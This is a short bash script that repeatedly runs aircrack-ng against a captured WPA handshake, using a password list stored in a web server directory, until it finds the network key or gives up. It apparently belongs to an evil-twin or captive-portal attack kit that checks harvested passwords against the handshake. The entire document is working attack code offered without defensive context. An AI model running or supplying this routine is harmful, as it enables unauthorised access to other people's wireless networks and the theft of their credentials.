#!/bin/bash
count=0
while true
do
	aircrack-ng handshake_cap/handshake-01.cap -w /var/www/html/passwords.txt | grep "KEY FOUND"> /dev/null
	flag=$(echo $?)
	printf "[-$count-]   trying. . .\n"
	if [[ $flag == 0 ]]
	then
		printf "\n[!!] password found!\n"
		exit
	else
		sleep 2
		count=`expr $count + 1`
		if [[ $count -gt 120 ]]
		then
			exit
		fi
	fi
done
